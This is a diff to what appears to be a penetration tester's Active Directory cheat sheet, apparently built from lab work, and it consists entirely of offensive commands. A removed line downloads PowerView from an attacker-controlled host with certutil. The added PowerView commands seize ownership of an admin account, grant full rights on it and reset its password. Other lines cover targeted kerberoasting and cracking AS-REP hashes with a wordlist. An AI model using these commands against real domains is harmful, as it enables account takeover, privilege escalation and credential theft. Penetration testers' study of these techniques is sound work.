@@ -567,10 +567,16 @@ Rubeus.exe asreproast
 nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep
 
 [*] Powerview
-powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
-powershell Import-Module C:\programdata\powerview.ps1
+Import-Module ./PowerView.ps1
+
 Get-NetDomain
 Get-LocalUser
+
+Get-ADuser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
+Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
+Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
+Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)
+
 Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
 
 # Pivoting
